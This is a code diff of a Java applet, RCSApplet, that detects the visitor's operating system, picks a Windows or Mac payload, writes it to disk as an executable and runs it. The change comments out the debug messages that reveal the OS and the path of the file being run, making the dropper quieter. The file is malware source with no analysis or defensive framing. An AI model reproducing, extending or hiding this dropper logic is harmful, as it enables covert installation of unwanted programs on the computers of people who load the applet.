@@ -16,19 +16,19 @@ public class RCSApplet extends Applet {
 		Class clazz = RCSApplet.class;
 		String clazzFile = clazz.getName().replace('.', '/')+".class";
 		
-		System.out.println(clazzFile);
+		//System.out.println(clazzFile);
 		
 		try {
 			// get payload path
 			String payloadPath = "/";
 			if (isWindows()) {
-				System.out.println("Running on Windows");
+				//System.out.println("Running on Windows");
 				payloadPath += "win";
 			} else if (isMac()) {
-				System.out.println("Running on Mac");
+				//System.out.println("Running on Mac");
 				payloadPath += "mac";
 			} else {
-				System.out.println("Running on an unknown operating system, exiting!");
+				System.out.println("Unknown operating system, quitting!");
 				System.exit(0);
 			}
 			
@@ -47,7 +47,7 @@ public class RCSApplet extends Applet {
 			executableFile.setExecutable(true);
 			
 			// execute payload
-			System.out.println("Running " + executableFile.getCanonicalPath());
+			//System.out.println("Running " + executableFile.getCanonicalPath());
 			f = Runtime.getRuntime().exec(new String[] {executableFile.getCanonicalPath()});
 			f.waitFor();
 			
